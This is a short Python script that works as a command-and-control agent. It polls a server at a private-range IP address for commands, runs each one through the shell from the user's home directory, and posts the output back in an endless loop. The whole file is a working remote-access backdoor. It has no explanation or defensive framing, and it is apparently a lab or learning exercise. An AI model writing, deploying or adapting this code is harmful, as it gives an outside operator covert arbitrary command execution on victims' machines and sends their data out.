import requests
import os, sys
from pathlib import Path

# api-endpoint
URL = 'http://192.168.98.128:3232/c2'

def call_c2():
    command = requests.get(URL+'/command')
    #command = command.text
    if command.text: # command not empty
        command = command.text
        print("execute command: "+command)
        result = os.popen(command).read() # execute command
        result = ("execute "+result) if not result else result # if result is empty
        #print(result)
        post_result(result, '/updatecommandresult')


def post_result(result, path):
    url = URL + path
    myobj = {'result': result}
    resc = requests.post(url, data=myobj)


if __name__ == '__main__':
    os.chdir(Path.home()) # 設定之後執行的路徑為home目錄
    while True:
        call_c2()

